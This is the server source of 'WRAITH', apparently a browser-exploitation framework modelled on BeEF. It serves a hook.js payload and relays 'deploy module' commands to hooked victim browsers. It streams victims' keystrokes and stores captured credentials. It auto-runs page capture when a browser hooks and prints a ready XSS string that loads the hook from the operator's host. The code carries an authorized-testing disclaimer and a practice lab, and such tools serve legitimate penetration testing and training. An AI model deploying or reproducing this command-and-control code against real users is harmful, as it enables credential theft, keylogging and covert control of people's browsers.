// WRAITH server  ---------------------------------------------------------
// Single Node process that does everything BeEF's Ruby server + RESTful API
// did, minus the cruft:
//   * serves /hook.js (the payload), the demo "victim" page, and the operator GUI
//   * runs one WebSocket endpoint with two roles, routed by path:
//        /ws/hook      <- hooked browsers (victims) connect here
//        /ws/operator  <- the operator console connects here
//   * tracks online/offline victims, relays "deploy module" / "recall" commands
//     down to a victim, and streams keystrokes + captured creds up to operators.
//
// FOR AUTHORIZED SECURITY TESTING, RESEARCH & EDUCATION ONLY.
// -------------------------------------------------------------------------

const http = require('http');
const path = require('path');
const crypto = require('crypto');
const express = require('express');
const { WebSocketServer } = require('ws');

const config = require('./config');
const modules = require('./modules');
const store = require('./store');

// Reload persisted sessions so prior loot survives a restart / operator refresh.
store.load();

const app = express();
app.disable('x-powered-by');
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

// ---- operator authentication -------------------------------------------
// A signed HttpOnly session cookie gates the operator console (static panel +
// live WebSocket). The hook payload, the demo page, and the /ws/hook channel
// stay public on purpose -- victims must be able to reach them.
function signToken(payload) {
  const data = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const mac = crypto.createHmac('sha256', config.sessionSecret).update(data).digest('base64url');
  return data + '.' + mac;
}
function verifyToken(token) {
  if (!token || token.indexOf('.') < 0) return null;
  const i = token.indexOf('.');
  const data = token.slice(0, i), mac = token.slice(i + 1);
  const expected = crypto.createHmac('sha256', config.sessionSecret).update(data).digest('base64url');
  const a = Buffer.from(mac), b = Buffer.from(expected);
  if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) return null;
  let payload; try { payload = JSON.parse(Buffer.from(data, 'base64url').toString()); } catch { return null; }
  if (!payload || payload.exp < Date.now()) return null;
  return payload;
}
function parseCookies(req) {
  const out = {}, h = req.headers.cookie;
  if (h) h.split(';').forEach(p => { const i = p.indexOf('='); if (i > 0) out[p.slice(0, i).trim()] = p.slice(i + 1).trim(); });
  return out;
}
function isAuthed(req) {
  if (!config.operatorPassword) return true;                 // login disabled
  return !!verifyToken(parseCookies(req).wraith_session);
}
// Constant-time string compare that tolerates length mismatch without leaking it.
function safeEq(a, b) {
  const x = Buffer.from(String(a == null ? '' : a));
  const y = Buffer.from(String(b == null ? '' : b));
  return x.length === y.length && crypto.timingSafeEqual(x, y);
}
// Full operator credential check (form login): username (if configured) + password.
function credsOk(user, pw) {
  if (!config.operatorPassword) return true;                 // login disabled
  const userOk = !config.operatorUser || safeEq(user, config.operatorUser);
  return userOk && safeEq(pw, config.operatorPassword);
}
// Password-only check for the scripted operator WebSocket (?key=...).
function passwordOk(pw) {
  if (!config.operatorPassword) return true;
  return safeEq(pw, config.operatorPassword);
}
function requireAuth(req, res, next) { return isAuthed(req) ? next() : res.redirect('/login'); }

app.get('/login', (req, res) => {
  if (isAuthed(req)) return res.redirect('/operator/');
  res.type('html').send(loginPage(''));
});
app.post('/login', (req, res) => {
  const body = req.body || {};
  if (credsOk(body.username, body.password)) {
    const ms = config.sessionHours * 3600 * 1000;
    const secure = req.headers['x-forwarded-proto'] === 'https' || req.secure;
    res.cookie('wraith_session', signToken({ exp: Date.now() + ms }),
      { httpOnly: true, sameSite: 'lax', secure, maxAge: ms, path: '/' });
    return res.redirect('/operator/');
  }
  res.status(401).type('html').send(loginPage('Authentication failed.'));
});
app.post('/logout', (req, res) => { res.clearCookie('wraith_session', { path: '/' }); res.redirect('/login'); });

// ---- static assets ------------------------------------------------------
const PUBLIC = path.join(__dirname, 'public');

// hook.js is served explicitly with no-cache so edits during class take effect
// immediately and so it is reachable at a clean /hook.js path (BeEF parity).
app.get('/hook.js', (_req, res) => {
  res.set('Cache-Control', 'no-store');
  res.type('application/javascript');
  res.sendFile(path.join(PUBLIC, 'hook.js'));
});

// The demo "victim" landing page. Open this in the browser you want to hook.
app.use('/demo', express.static(path.join(PUBLIC, 'demo')));

// Deliberately vulnerable practice lab (stored XSS + interlinked pages) for
// end-to-end hook + Page Mirror demos. Same origin, so /hook.js loads cleanly.
app.use('/lab', require('./lab'));

// The operator console (login-gated).
app.use('/operator', requireAuth, express.static(path.join(PUBLIC, 'operator')));

// Optional self-hosted vendor libs (e.g. html2canvas for offline screenshots).
app.use('/vendor', express.static(path.join(PUBLIC, 'vendor')));

// Friendly root: point people at the two entry points.
app.get('/', (_req, res) => {
  res.type('html').send(`<!doctype html><meta charset="utf-8">
  <title>WRAITH</title>
  <body style="font:16px/1.6 system-ui;max-width:640px;margin:60px auto;color:#111">
  <h1>WRAITH <small style="color:#888;font-weight:400">browser hook framework</small></h1>
  <p>For authorized security testing, research &amp; education only.</p>
  <ul>
    <li><a href="/operator/">Operator console</a> &mdash; watch hooked browsers, deploy modules.</li>
    <li><a href="/demo/">Demo victim page</a> &mdash; open this in the browser you want to hook.</li>
    <li><code>/hook.js</code> &mdash; the payload (embed via <code>&lt;script src="/hook.js"&gt;&lt;/script&gt;</code>).</li>
  </ul></body>`);
});

// Operator login page (WRAITH-branded, matches the console aesthetic).
function loginPage(err) {
  return `<!doctype html><html lang="en"><head><meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>WRAITH &mdash; Sign in</title>
<link rel="preconnect" href="https://fonts.googleapis.com"/>
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet"/>
<style>
 *{box-sizing:border-box}
 body{margin:0;min-height:100vh;display:grid;place-items:center;color:#eef3f8;
   font-family:'Inter',system-ui,sans-serif;background-color:#06070a;
   background-image:radial-gradient(600px 360px at 50% -12%,rgba(0,225,255,.10),transparent 60%),
     linear-gradient(rgba(255,255,255,.016) 1px,transparent 1px),
     linear-gradient(90deg,rgba(255,255,255,.016) 1px,transparent 1px);
   background-size:auto,30px 30px,30px 30px}
 .box{width:340px;border:1px solid #323a45;border-top:2px solid #00e1ff;background:#0c0e13;padding:28px}
 .mk{width:40px;height:40px;display:grid;place-items:center;background:#00e1ff;color:#041014;
   margin-bottom:16px;box-shadow:0 0 18px rgba(0,225,255,.5)}
 .mk svg{width:23px;height:23px}
 h1{font-size:22px;font-weight:800;letter-spacing:2px;margin:0 0 4px;text-transform:uppercase}
 .sub{font-family:'JetBrains Mono',monospace;font-size:10px;letter-spacing:2.4px;color:#00e1ff;
   text-transform:uppercase;margin-bottom:22px}
 label{display:block;font-family:'JetBrains Mono',monospace;font-size:10px;letter-spacing:1px;
   text-transform:uppercase;color:#5e6a78;margin-bottom:6px}
 input{width:100%;background:#070809;border:1px solid #323a45;color:#eef3f8;padding:11px 12px;
   font-family:'JetBrains Mono',monospace;font-size:14px;outline:none}
 input:focus{border-color:#00e1ff;box-shadow:0 0 0 1px #00e1ff}
 button{width:100%;margin-top:16px;background:#00e1ff;color:#041014;border:none;padding:12px;
   font-family:'JetBrains Mono',monospace;font-weight:700;font-size:13px;letter-spacing:1.5px;
   text-transform:uppercase;cursor:pointer;box-shadow:0 0 18px -4px #00e1ff}
 button:hover{background:#5cecff}
 .err{color:#ff4242;font-family:'JetBrains Mono',monospace;font-size:12px;margin-top:14px}
 .auth{margin-top:18px;font-family:'JetBrains Mono',monospace;font-size:9px;letter-spacing:1.6px;
   color:#ffaf1a;text-transform:uppercase}
</style></head>
<body><form class="box" method="post" action="/login">
 <div class="mk"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"><circle cx="12" cy="12" r="7.2"/><line x1="12" y1="1.6" x2="12" y2="5"/><line x1="12" y1="19" x2="12" y2="22.4"/><line x1="1.6" y1="12" x2="5" y2="12"/><line x1="19" y1="12" x2="22.4" y2="12"/><circle cx="12" cy="12" r="1.7" fill="currentColor" stroke="none"/></svg></div>
 <h1>WRAITH</h1><div class="sub">Operator Console</div>
 ${config.operatorUser ? `<label for="u">Username</label>
 <input id="u" name="username" type="text" autofocus autocomplete="username" autocapitalize="none" spellcheck="false"/>` : ''}
 <label for="p">Password</label>
 <input id="p" name="password" type="password"${config.operatorUser ? '' : ' autofocus'} autocomplete="current-password"/>
 <button type="submit">Authenticate</button>
 ${err ? '<div class="err">' + err + '</div>' : ''}
 <div class="auth">&#9888; Authorized operator use only</div>
</form></body></html>`;
}

const server = http.createServer(app);

// ---- WebSocket layer ----------------------------------------------------
// Two separate WSS instances (noServer) multiplexed onto one HTTP server,
// picked by the upgrade request path.
const hookWss = new WebSocketServer({ noServer: true });
const opWss = new WebSocketServer({ noServer: true });

server.on('upgrade', (req, socket, head) => {
  const { pathname, searchParams } = new URL(req.url, 'http://localhost');
  if (pathname === '/ws/hook') {
    hookWss.handleUpgrade(req, socket, head, ws => hookWss.emit('connection', ws, req));
  } else if (pathname === '/ws/operator') {
    // Browser operators authenticate via the session cookie (sent on the
    // upgrade). Scripted operators may pass ?key=<password> instead.
    const keyParam = searchParams.get('key');
    const keyOk = config.operatorPassword && keyParam && passwordOk(keyParam);
    if (!isAuthed(req) && !keyOk) {
      socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
      socket.destroy();
      return;
    }
    opWss.handleUpgrade(req, socket, head, ws => opWss.emit('connection', ws, req));
  } else {
    socket.destroy();
  }
});

// ---- state --------------------------------------------------------------
/** victims: id -> { id, ws, fp, online, hookedAt, lastSeen, activeModule } */
const victims = new Map();
const operators = new Set();

function send(ws, obj) {
  if (ws && ws.readyState === ws.OPEN) ws.send(JSON.stringify(obj));
}
function toOperators(obj) {
  const msg = JSON.stringify(obj);
  for (const op of operators) if (op.readyState === op.OPEN) op.send(msg);
}
// Every activity-feed line is both broadcast live AND stored, so a console that
// connects later (or after a restart) replays the same history.
function emitEvent(level, text, victimId) {
  const at = Date.now();
  store.addEvent(level, text, victimId, at);
  toOperators({ type: 'event', level, victimId, text, at });
}
function clientIp(req) {
  const xff = req.headers['x-forwarded-for'];
  if (xff) return xff.split(',')[0].trim();
  return (req.socket.remoteAddress || '').replace(/^::ffff:/, '');
}
function sanitizeFp(fp) {
  const s = v => (typeof v === 'string' ? v.slice(0, 300) : v);
  return {
    ip: s(fp.ip), browser: s(fp.browser), os: s(fp.os),
    ua: s(fp.ua), lang: s(fp.lang), screen: s(fp.screen),
    page: s(fp.page), title: s(fp.title), referrer: s(fp.referrer),
    origin: s(fp.origin), cookies: (typeof fp.cookies === 'number' ? fp.cookies : 0)
  };
}
function pushRoster() {
  // Roster comes from the store so offline/historical sessions stay listed.
  toOperators({ type: 'roster', victims: store.roster() });
}

// ---- hooked-browser connections ----------------------------------------
hookWss.on('connection', (ws, req) => {
  let victim = null;
  ws.isAlive = true;
  ws.on('pong', () => { ws.isAlive = true; if (victim) victim.lastSeen = Date.now(); });

  ws.on('message', raw => {
    let msg; try { msg = JSON.parse(raw); } catch { return; }

    if (msg.type === 'register') {
      const id = crypto.randomUUID().slice(0, 8);
      const now = Date.now();
      const fp = sanitizeFp(msg.fp || {});
      fp.ip = clientIp(req); // trust the socket, not the client, for IP
      victim = { id, ws, fp, online: true, hookedAt: now, lastSeen: now, activeModule: null };
      victims.set(id, victim);
      store.upsert(id, fp, now);
      send(ws, { type: 'registered', id });
      emitEvent('hook', `New browser hooked from ${fp.ip || '?'} (${fp.browser || 'unknown'} / ${fp.os || '?'})`, id);
      pushRoster();

      // Blind-XSS behavior: a real blind-XSS payload calls home with the loot the
      // instant it fires -- nobody is standing by to press a button. So auto-fire
      // the Page Capture task the moment a browser hooks. Same task path a manual
      // deploy uses, so results land in the same "Page Capture" viewer. The BeEF-
      // style manual flow is still available with WRAITH_AUTOCAPTURE=0.
      if (config.autoCapture) {
        const cap = modules.get('capture');
        if (cap && cap.run) {
          send(ws, { type: 'task', taskId: cap.id, params: {}, script: cap.run });
          emitEvent('cmd', 'Auto-capture dispatched (blind-XSS loot on hook)', id);
        }
      }
      return;
    }

    if (!victim) return;
    const at = Date.now();
    victim.lastSeen = at;
    store.touch(victim.id, at);

    if (msg.type === 'keystroke') {
      // Live-only: streamed to operators, not persisted (the submitted
      // credentials below are the durable artifact).
      toOperators({ type: 'keystroke', victimId: victim.id,
                    module: msg.module, field: msg.field, value: msg.value });
    } else if (msg.type === 'capture') {
      store.addLoot(victim.id, msg.module, msg.data, at);
      store.setActiveModule(victim.id, null);
      toOperators({ type: 'capture', victimId: victim.id, module: msg.module, data: msg.data, at });
      emitEvent('loot', `CREDENTIALS captured via ${msg.module}`, victim.id);
      victim.activeModule = null;
      pushRoster();
    } else if (msg.type === 'task-result') {
      if (msg.task === 'capture') store.captureResult(victim.id, msg.result);
      else store.scanResult(victim.id, msg.result);
      toOperators({ type: 'task-result', victimId: victim.id, task: msg.task, result: msg.result });
    } else if (msg.type === 'task-done') {
      if (msg.task === 'capture') store.captureDone(victim.id);
      else store.scanDone(victim.id, msg.summary || null);
      toOperators({ type: 'task-done', victimId: victim.id, task: msg.task, summary: msg.summary || null });
      emitEvent('cmd', `Task "${msg.task}" finished`, victim.id);
    } else if (msg.type === 'mirror-page') {
      // Page the victim mirrored back -- stored immediately, then relayed.
      const page = { url: msg.url, finalUrl: msg.finalUrl || msg.url, status: msg.status || 0,
                     html: msg.html || '', error: msg.error || null, at };
      store.addPage(victim.id, page);
      toOperators({ type: 'mirror-page', victimId: victim.id, reqId: msg.reqId,
                    url: page.url, finalUrl: page.finalUrl, status: page.status,
                    html: page.html, error: page.error, at });
    }
  });

  ws.on('close', () => {
    if (victim) {
      victim.online = false;
      const at = Date.now();
      victim.lastSeen = at;
      store.setOnline(victim.id, false, at);
      emitEvent('off', 'Browser went offline', victim.id);
      pushRoster();
    }
  });
  ws.on('error', () => {});
});

// Liveness sweep: ping hooks, drop the ones that stopped answering.
const sweep = setInterval(() => {
  for (const v of victims.values()) {
    if (!v.online) continue;
    if (v.ws.isAlive === false) { v.ws.terminate(); continue; }
    v.ws.isAlive = false;
    try { v.ws.ping(); } catch {}
  }
}, 15000);
sweep.unref?.();

// ---- operator connections ----------------------------------------------
opWss.on('connection', ws => {
  operators.add(ws);
  send(ws, { type: 'hello', modules: modules.list().map(m => ({ id: m.id, label: m.label, blurb: m.blurb, kind: m.kind || 'overlay' })) });
  // Full history in one shot: sessions, captures, credentials, scans, feed.
  send(ws, store.snapshot());

  ws.on('message', raw => {
    let msg; try { msg = JSON.parse(raw); } catch { return; }
    const v = msg.victimId && victims.get(msg.victimId);

    if (msg.type === 'deploy' && v && v.online) {
      const mod = modules.get(msg.moduleId);
      if (!mod) return;
      if (mod.kind === 'task') {
        // Background task (e.g. portscan): ship the runner + params, no overlay.
        send(v.ws, { type: 'task', taskId: mod.id, params: msg.params || {}, script: mod.run || '' });
        emitEvent('cmd', `Started task "${mod.label}"`, v.id);
      } else {
        v.activeModule = mod.id;
        store.setActiveModule(v.id, mod.id);
        send(v.ws, { type: 'deploy', moduleId: mod.id, html: mod.html, css: mod.css, script: mod.script || '' });
        emitEvent('cmd', `Deployed "${mod.label}" overlay`, v.id);
        pushRoster();
      }
    } else if (msg.type === 'recall' && v && v.online) {
      v.activeModule = null;
      store.setActiveModule(v.id, null);
      send(v.ws, { type: 'recall' });
      emitEvent('cmd', 'Recalled / stopped', v.id);
      pushRoster();
    } else if ((msg.type === 'mirror-dom' || msg.type === 'mirror-fetch') && v && v.online) {
      // Relay a mirror request to the victim (live DOM, or fetch a same-origin URL).
      send(v.ws, { type: msg.type, reqId: msg.reqId, url: msg.url });
    } else if (msg.type === 'hide' && msg.victimId) {
      // Remove the card from the console but KEEP everything on disk.
      store.setHidden(msg.victimId, true);
      pushRoster();
    } else if (msg.type === 'forget' && msg.victimId) {
      // Permanent delete: drop a session from history entirely.
      const live = victims.get(msg.victimId);
      if (!live || !live.online) {
        victims.delete(msg.victimId);
        store.remove(msg.victimId);
        pushRoster();
      }
    }
  });

  ws.on('close', () => operators.delete(ws));
  ws.on('error', () => {});
});

// ---- go -----------------------------------------------------------------
// Fail-safe: never expose an un-authenticated operator panel on a public
// interface. If bound anywhere but loopback, an operator password is required.
const isPublicBind = config.host !== '127.0.0.1' && config.host !== 'localhost';
if (isPublicBind && !config.operatorPassword) {
  console.error('\n  WRAITH refused to start.');
  console.error('  Bound to a public interface (' + config.host + ') with NO operator login.');
  console.error('  Set WRAITH_OP_PASSWORD=<password> to expose the operator console safely.\n');
  process.exit(1);
}

// Flush pending session data on shutdown (systemctl restart sends SIGTERM) so
// the last debounced write isn't lost.
function shutdown() { try { store.flush(); } catch (e) {} process.exit(0); }
process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);

server.listen(config.port, config.host, () => {
  // Advertise the operator's real IP/domain when set (WRAITH_PUBLIC_URL); else
  // fall back to the bind host. hook.js still derives its own callback origin, so
  // this only affects the URLs we PRINT for convenience.
  const shown = config.host === '0.0.0.0' ? 'localhost' : config.host;
  const base = config.publicUrl || `http://${shown}:${config.port}`;
  const login = config.operatorPassword
    ? 'ENABLED' + (config.operatorUser ? ` (user "${config.operatorUser}")` : '')
    : 'DISABLED (localhost only)';
  console.log('  WRAITH  -  browser hook framework  (authorized operator use only)');
  console.log('  ----------------------------------------------------------');
  console.log(`  Operator console : ${base}/operator/`);
  console.log(`  Demo victim page : ${base}/demo/`);
  console.log(`  Hook payload     : ${base}/hook.js`);
  console.log(`  XSS payload      : "><script src="${base}/hook.js"></script>`);
  console.log('  Operator login   : ' + login);
  console.log('  Bound to         : ' + config.host + ':' + config.port);
  console.log('  ----------------------------------------------------------');
});
